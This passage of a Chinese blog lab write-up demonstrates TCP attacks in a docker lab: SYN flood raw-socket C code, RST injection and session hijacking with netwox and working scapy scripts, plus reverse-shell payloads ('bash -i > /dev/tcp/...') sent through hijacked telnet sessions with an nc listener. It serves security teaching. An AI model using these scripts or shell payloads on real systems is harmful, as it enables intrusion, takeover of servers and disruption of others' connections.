class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************************</span></span><br><span class="line"><span class="comment">  Given an IP packet, send it out using a raw socket.</span></span><br><span class="line"><span class="comment">**************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_raw_ip_packet</span><span class="params">(struct ipheader* ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">    <span class="keyword">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<span class="comment">//sock_raw是原始套接字，发送IP或者链路层报文</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">                     &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), <span class="number">0</span>,</span><br><span class="line">           (struct sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">in_cksum</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *buf, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span> *w = buf;</span><br><span class="line">   <span class="keyword">int</span> nleft = length;</span><br><span class="line">   <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span> temp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * The algorithm uses a 32 bit accumulator (sum), adds</span></span><br><span class="line"><span class="comment">    * sequential 16 bit words to it, and at the end, folds back all</span></span><br><span class="line"><span class="comment">    * the carry bits from the top 16 bits into the lower 16 bits.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">while</span> (nleft &gt; <span class="number">1</span>)  &#123;</span><br><span class="line">       sum += *w++;</span><br><span class="line">       nleft -= <span class="number">2</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* treat the odd byte at the end, if any */</span></span><br><span class="line">   <span class="keyword">if</span> (nleft == <span class="number">1</span>) &#123;</span><br><span class="line">        *(u_char *)(&amp;temp) = *(u_char *)w ;</span><br><span class="line">        sum += temp;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* add back carry outs from top 16 bits to low 16 bits */</span></span><br><span class="line">   sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>);  <span class="comment">// add hi 16 to low 16</span></span><br><span class="line">   sum += (sum &gt;&gt; <span class="number">16</span>);                  <span class="comment">// add carry</span></span><br><span class="line">   <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">  TCP checksum is calculated on the pseudo header, which includes</span></span><br><span class="line"><span class="comment">  the TCP header and data, plus some part of the IP header.</span></span><br><span class="line"><span class="comment">  Therefore, we need to construct the pseudo header first.</span></span><br><span class="line"><span class="comment">*****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">calculate_tcp_checksum</span><span class="params">(struct ipheader *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> *<span class="title">tcp</span> =</span> (struct tcpheader *)((u_char *)ip +</span><br><span class="line">                            <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> tcp_len = ntohs(ip-&gt;iph_len) - <span class="keyword">sizeof</span>(struct ipheader);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* pseudo tcp header for the checksum computation */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pseudo_tcp</span> <span class="title">p_tcp</span>;</span></span><br><span class="line">   <span class="built_in">memset</span>(&amp;p_tcp, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(struct pseudo_tcp));</span><br><span class="line"></span><br><span class="line">   p_tcp.saddr  = ip-&gt;iph_sourceip.s_addr;</span><br><span class="line">   p_tcp.daddr  = ip-&gt;iph_destip.s_addr;</span><br><span class="line">   p_tcp.mbz    = <span class="number">0</span>;</span><br><span class="line">   p_tcp.ptcl   = IPPROTO_TCP;</span><br><span class="line">   p_tcp.tcpl   = htons(tcp_len);</span><br><span class="line">   <span class="built_in">memcpy</span>(&amp;p_tcp.tcp, tcp, tcp_len);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span>  (<span class="keyword">unsigned</span> <span class="keyword">short</span>) in_cksum((<span class="keyword">unsigned</span> <span class="keyword">short</span> *)&amp;p_tcp,</span><br><span class="line">                                     tcp_len + <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到服务器多了很多半开连接，用户尝试登入telnet无法成功，<strong>打开syn_cookies</strong>能够成功访问服务器的telnet服务，效果和上面的netwox攻击一样。</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood10.png"></p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood11.png"></p>
</li>
</ol>
<h3 id="2-TCP-Reset攻击"><a href="#2-TCP-Reset攻击" class="headerlink" title="2.TCP Reset攻击"></a>2.TCP Reset攻击</h3><p><strong>原理：</strong>两个用户A、B之间存在已建立的telnet连接（TCP），则攻击者可以伪造一个从A到B的RST报文，从而破坏此现有连接。</p>
<p>要成功进行此攻击，攻击者需要正确构建 TCP RST 数据包。首先，每个 TCP 连接都由一 个四元组唯一标识：源 IP 地址、源端口、目的 IP 地址、目的端口，因此，伪造数据包的这 4 个域必须和连接中使用的一致。其次，伪造数据包的序列号必须是正确的，否则接收方会丢弃这个包。 在此任务中，需要启动 TCP RST 攻击以中断 A 和 B 之间的现有 telnet 连接。之后，尝试对 telnet 或 ssh连接进行相同的攻击。为了简化实验，我们假设攻击者和受害者在同一个局域网上， 即攻击者可以观察到 A 和 B 之间的 TCP 流量。</p>
<p><strong>过程：</strong></p>
<ol>
<li><p><strong>netwox攻击</strong></p>
<p>首先打开wireshark，过滤器搜索telnet，监听局域网中的telnet会话；接着打开服务器的telnet服务，客户机登入telnet，可见wireshark获取到了telnet包。设置wireshark显示的序列号为绝对序列号：右键-&gt;首选项-&gt;取消勾选relative sequence numbers。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset2.png"></p>
<p>使用netwox的工具搜索功能搜索到tcp reset攻击需要用到的78号工具（reset every tcp packet），使用命令<code>netwox 78 --help</code>查看使用手册：</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset1.png"></p>
<p>使用攻击命令<code>netwox 78 -d docker0 -i &quot;172.17.0.3&quot;</code>，对网卡docker0进行监听并通过它攻击。（需要注意的是，netwox的78号工具只能对本地网卡上的TCP连接进行阻断，详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013014606/article/details/78298274">这个博客</a>）可以看到原来可以正常访问的用户和服务器的telnet连接被阻断了，wireshark也抓到了RST包，显示78号工具的机制是不停地发送RST包。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset3.png"></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset4.png"></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset5.png"></p>
</li>
<li><p><strong>scapy手动攻击</strong></p>
<p>手动攻击的策略是，先进行wireshark截包，再修改python脚本攻击。</p>
<p>客户机登入telnet，通过wireshark截包可以看到最后一个包是客户机发给服务器地ACK包，ACK号是3880302867，客户机开放的端口是46412，服务器端口号23</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset6.png"></p>
<p>那么我们编写python脚本构建一个RST报文，源ip是服务器ip，目的ip是客户机ip，tcp源端口23，目的端口46412：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SENDING RESET PACKET.........&quot;</span>)</span><br><span class="line">ip  = IP(src=<span class="string">&quot;172.17.0.2&quot;</span>, dst=<span class="string">&quot;172.17.0.3&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">23</span>, dport=<span class="number">46412</span>,flags=<span class="string">&quot;R&quot;</span>,seq=<span class="number">3880302867</span>)<span class="comment">#R表示rst报文，seq和分析的报文的ack一致</span></span><br><span class="line">pkt = ip/tcp</span><br><span class="line">ls(pkt)  <span class="comment">#列出报文中每个字段的信息</span></span><br><span class="line">send(pkt,verbose=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用命令<code>python reset_manual.py</code>执行脚本</p>
<p>结果发现虽然脚本执行成功了，但是wireshark并没有抓到包，于是考虑是不是scapy版本过期了，但是使用<code>apt-get upgrade scapy</code>提示告诉我们scapy已经到达最新版本了。那么就有可能是python的版本低了无法运行高版本的scapy。尝试使用命令<code>python3 reset_manual.py</code>，错误提示为找不到scapy，那么就下载pip3（<code>apt install python3-pip -y</code>）并且用pip3下载scapy。（<code>pip3 install scapy</code>）</p>
<p>需要注意我这里遇到了下图问题，网上说是pip源太慢了需要换源，于是使用命令<code>mkdir ~/.pip</code> <code>cd ~/.pip</code>创建隐藏文件夹.pip，并使用命令<code>touch pip.conf</code>创建pip.conf文件，在该文件中写入以下内容，保存后就可以使用新的pip源下载scapy了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure>

<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset7.png"></p>
<p>使用python3 reset_manual.py执行脚本，成功攻击，客户机的telnet连接被中断，wireshark截获到reset包，并且正是我们构建的对应序列号的RST包。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset8.png"></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset9.png"></p>
<blockquote>
<p>后来发现根本不是scapy版本的问题，是我ip地址写错了，用python2的老版scapy也可以完成攻击（只不过会有“没有ipv6”的warning，但是不影响）</p>
</blockquote>
</li>
<li><p><strong>scapy自动攻击</strong></p>
<p>编写python脚本实现自动攻击，首先使用scapy的sniff函数嗅探到一个tcp连接，使用filter过滤其它的ip端口，仅嗅探从客户端发给服务器23端口的链接。获取嗅探的包中的ack号和端口号等信息，填充进我们新构建的RST包，并发送。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SRC  = <span class="string">&quot;172.17.0.3&quot;</span></span><br><span class="line">DST  = <span class="string">&quot;172.17.0.2&quot;</span></span><br><span class="line">PORT = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    old_tcp = pkt[TCP]  <span class="comment">#监听的报文的TCP首部</span></span><br><span class="line">    old_ip  = pkt[IP]   <span class="comment">#监听的报文的IP首部</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    ip  =  IP( src   = old_ip.dst ,  <span class="comment">#old_ip.dst</span></span><br><span class="line">               dst   = old_ip.src    <span class="comment">#old_ip.src</span></span><br><span class="line">             )</span><br><span class="line">    tcp = TCP( sport = old_tcp.dport ,  <span class="comment">#old_tcp.dport</span></span><br><span class="line">               dport = old_tcp.sport ,  <span class="comment">#old_tcp.sport</span></span><br><span class="line">               seq   = old_tcp.ack ,  <span class="comment">#上一个报文的ack</span></span><br><span class="line">               flags = <span class="string">&quot;R&quot;</span></span><br><span class="line">             ) </span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line"></span><br><span class="line">    pkt = ip/tcp</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Spoofed Packet: &#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ip.src, ip.dst))</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;tcp and src host &#123;&#125; and dst host &#123;&#125; and dst port &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(SRC, DST, PORT)</span><br><span class="line">sniff(<span class="built_in">filter</span>=f, prn=spoof,iface=<span class="string">&quot;docker0&quot;</span>) </span><br></pre></td></tr></table></figure>

<p>提前打开wireshark和连接好telnet，使用命令<code>python3 reset_auto.py</code>执行脚本，可以看到脚本发送了两个RST包给客户端，并且客户端的telnet连接被中断了。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset10.png"></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset11.png"></p>
<p>仔细分析wireshark，我们可以看见第86号包是客户机发给服务器的数据包，数据内容是l，这是因为在执行脚本之后，脚本会等待客户发给服务器数据，于是我们输入一个l，这时telnet就会建立tcp连接，将数据l传给服务器，而下一条87号包是服务器回传数据l给客户机，让l可以显示到客户机的屏幕上。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset12.png"></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset13.png"></p>
<p>第88号包是客户机对服务器刚发过来的报文做的ack回应。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset14.png"></p>
<p>因此，从脚本开始运行到现在，sniff嗅探到了两个客户机发给服务器的包，分别是l数据包和ack应答包，那么脚本就会发挥它的功能针对这两个包的ack构建RST包，如图所示：</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset15.png"></p>
</li>
</ol>
<h3 id="3-TCP会话劫持攻击"><a href="#3-TCP会话劫持攻击" class="headerlink" title="3.TCP会话劫持攻击"></a>3.TCP会话劫持攻击</h3><p><strong>原理：</strong>通过向会话中注入<strong>恶意内容</strong>来劫持两个受害者之间的现有TCP连接，比如假装用户向服务器发送恶意命令（例如删除文件）</p>
<p><strong>过程：</strong></p>
<ol>
<li><p><strong>netwox攻击</strong></p>
<p>首先打开wireshark并且连接telnet，因为我们要模拟客户机向服务器发包，所以要找到最后一个由服务器发给客户机的包，如下图中62号包，客户机的端口号是46860，该包的序列号是3346538553（因此我们构造的包发送的ack号应该是3346538554），ack号是2353943332（就是我们构造的包的序列号），window size是227.</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof2.png"></p>
<p>netwox使用40号工具完成攻击，40号工具的帮助如下：</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof1.png"></p>
<p>我们用netwox构造指定的sip，dip，sport，dport，并且加上特定的序列号和ack号，还要填充我们的攻击指令进data段。命令如下：</p>
<p><code>netwox 40 --ip4-src 客户机ip --ip4-dst 服务器ip --tcp-src 客户机端口 --tcp-dst 23（telnet） --tcp-seqnum 伪造的序列号 --tcp-acknum 对应的ack号 --tcp-ack --tcp-window 服务器窗口大小 --tcp-data &quot;6c730d00（ls\r（回车）的16进制）&quot;</code></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof3.png"></p>
<p>构造的tcp数据包被wireshark截获，数据段为ls\r</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof4.png"></p>
<p>而服务器对我们构造的恶意指令的响应，一个是69号包对ls指令的回显，另一个是70号包返回给我们客户端当前目录下的内容（即ls的功能）</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof5.png"></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof6.png"></p>
<p>而后面黑色的部分都是服务器对69号包的重发，因为它服务器的期望收到的序列号已经被我们一次发包增加了几个字节，而telnet一次只会发一个字节，因此客户机发的包始终不满足服务器的要求，会被服务器丢弃，导致服务器一直重发索要正确序列号的包。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof7.png"></p>
<p><strong>反向shell攻击：</strong>攻击服务器，让服务器向攻击者建立连接。使用bash -i命令让服务器打开bash，但是想要让攻击机能够控制bash的输入输出（比如自己可以看到输出）就要使用bash的重定向。</p>
<p><code>bash -i &gt; /dev/tcp/ip/port</code>将bash的输出重定向到tcp连接，同时攻击者要打开对对应端口的监听（<code>nc -lvp 4567</code>）。</p>
<p><code>bash -i &gt; /dev/tcp/ip/port 2&gt;&amp;1</code>将bash输出也重定向到1（标准输出）的输出处，即tcp连接.</p>
<p><code>bash -i &gt; /dev/tcp/ip/port 2&gt;&amp;1 0&lt;&amp;1</code>将文件描述符0（标准输入）重定向到tcp连接中。（即完成反向shell）</p>
<p>使用命令 <code>bash -i &gt; /dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1</code>的ascii码，<code>0a62617368202d69203e2f6465762f7463702f3137322e31372e302e312f3435363720323e263120303c26310a00</code>，将其填充到netwox的data段。客户机再打开一个终端监听4567端口<code>nc -lvp 4567</code></p>
<p>结果如下，监听的终端获取到了服务器的shell，输入ifconfig可以看到出现的是服务器的ip地址</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof13.png"></p>
</li>
<li><p><strong>scapy手动攻击</strong></p>
<p>和netwox攻击一样，先用wireshark获取相关信息再构建恶意报文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SENDING SESSION HIJACKING PACKET.........&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip  = IP(src=<span class="string">&quot;172.17.0.3&quot;</span>, dst=<span class="string">&quot;172.17.0.2&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">46876</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=<span class="number">1636165935</span>, ack=<span class="number">494355393</span>)</span><br><span class="line">data = <span class="string">&quot;\n touch /tmp/myfile.txt\n&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line">send(pkt, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们成功发送的报文如图所示</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof8.png">服务器回复的报文如下</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof9.png"></p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof10.png"></p>
<p><strong>反向shell攻击：</strong>和前面一样，只不过把脚本中的data换成字符串”bash -i &gt; /dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1”，结果如下，成功获取到了服务器的shell。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof14.png"></p>
</li>
<li><p><strong>scapy自动攻击</strong></p>
<p>自动攻击和之前一样，不做赘述，脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SRC  = <span class="string">&quot;172.17.0.2&quot;</span></span><br><span class="line">DST  = <span class="string">&quot;172.17.0.3&quot;</span></span><br><span class="line">PORT = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    old_ip  = pkt[IP]</span><br><span class="line">    old_tcp = pkt[TCP]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    ip  =  IP( src   = old_ip.dst,</span><br><span class="line">               dst   = old_ip.src</span><br><span class="line">             )</span><br><span class="line">    tcp = TCP( sport = old_ip.dport,</span><br><span class="line">               dport = old_ip.sport,</span><br><span class="line">               seq   = old_ip.ack,</span><br><span class="line">               ack   = old_ip.seq+<span class="number">1</span>,</span><br><span class="line">               flags = <span class="string">&quot;A&quot;</span></span><br><span class="line">             )</span><br><span class="line">    data = <span class="string">&quot;ls\r&quot;</span></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line"></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>)</span><br><span class="line">    ls(pkt)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;tcp and src host &#123;&#125; and dst host &#123;&#125; and src port &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(SRC, DST, PORT)</span><br><span class="line">sniff(<span class="built_in">filter</span>=f, prn=spoof, iface = <span class="string">&quot;docker0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>执行攻击之后，脚本开始嗅探从服务器发出的包，因此我们需要在客户端输入一个字母，比如l，让服务器发送l的回显，这样这个回显就会被嗅探到。图中87号包就是服务器的回显。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof11.png"></p>
<p>那么脚本就会构造91号包来模拟用户机给服务器发包。</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof12.png"></p>
<p><strong>反向shell攻击：</strong>和前面一样，将data填充成攻击的字符串即可。但是需要注意的是，我们的自动脚本需要嗅探到tcp连接才可以构建对应的包，而用户登入telnet后，需要输入字符才会发送tcp报文，而这个输入的字符可能会和bash -i获取shell字符串组成一个字符串而导致服务器识别不到该命令，因此想要成功攻击，需要在bash攻击串前输入\n代表新的指令开始。如：<code>data = &quot;\nbash -i &gt; /dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1\n&quot;</code>结果如图所示</p>
<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof15.png"></p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" data-id="ckr5o9zzj002qxkur4au9fkru" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/TCP/" rel="tag">TCP</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/project/2021/04/23/DNS%E6%94%BB%E5%87%BB/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          DNS攻击
        
      </div>
    </a>
  
  
    <a href="/project/2021/04/18/%E9%80%86%E5%90%91/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">逆向</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/project/categories/Git/">Git</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/blog/">blog</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/">中国象棋</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">信息系统安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E5%AE%89%E5%8D%93/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/">虚拟机</a></li><li class="category-list-item"><a class="category-list-link" 